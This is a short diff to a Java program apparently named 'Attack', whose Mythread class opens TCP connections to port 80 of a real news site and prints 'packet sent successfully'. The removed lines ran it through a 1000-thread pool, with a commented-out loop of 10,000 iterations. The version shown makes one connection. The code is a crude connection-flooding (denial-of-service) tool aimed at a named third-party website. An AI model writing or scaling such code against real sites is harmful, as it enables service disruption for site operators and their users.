@@ -13,11 +13,11 @@ public class Attack {
         // TODO Auto-generated constructor stub
     }
     public static void main(String[] args){
-        ExecutorService es = Executors.newFixedThreadPool(1000);
-        Mythread mythread = new Mythread();
-        Thread thread = new Thread(mythread);
+//        ExecutorService es = Executors.newFixedThreadPool(1000);
+//        Mythread mythread = new Mythread();
+        new Thread(new Mythread()).start();
 //        for(int i = 0;i<10000;i++){
-            es.execute(thread);
+//            es.execute(thread);
 //        }
     }
 }
@@ -27,13 +27,11 @@ class Mythread implements Runnable {
             try {
                 Socket socket = new Socket("www.sohu.com", 80);
 //                socket.
-
                 System.out.println("发包成功！");
                 BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());
                 byte[] bytes = new byte[1024];
                 int len = -1;
                 StringBuffer sb = new StringBuffer();
-               
                     if(bis != null){
                         if((len = bis.read()) != -1){
 //                        		System.out.println(bis.read());
